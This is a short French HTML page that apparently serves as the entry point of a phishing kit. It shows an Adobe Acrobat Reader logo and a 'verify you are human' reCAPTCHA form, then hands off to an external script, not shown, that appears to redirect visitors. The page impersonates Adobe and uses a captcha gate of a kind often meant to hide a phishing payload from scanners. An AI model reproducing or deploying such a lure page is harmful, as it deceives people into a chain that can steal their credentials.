<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirection avec reCAPTCHA</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>

    <!-- Lien vers le fichier CSS externe -->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <img src="https://cdn2.iconfinder.com/data/icons/metro-uinvert-dock/256/Adobe_Acrobat_Reader.png" alt="Adobe Logo" class="logo">
        <div class="message">Veuillez vérifier que vous êtes un humain </div>
        
        <!-- Formulaire avec reCAPTCHA -->
        <form id="recaptcha-form" method="POST">
            <div class="g-recaptcha" 
                 data-sitekey="6LfTPWcqAAAAAMf4rEW8sI77-tN2SwWtpeaMobHe" 
                 data-callback="onRecaptchaSuccess"></div>
            <button type="submit" id="submit-btn" class="submit-btn" disabled>Soumettre</button>
        </form>
    </div>

    <!-- Lien vers le fichier JS externe -->
    <script src="form-handler.js"></script>
</body>
</html>
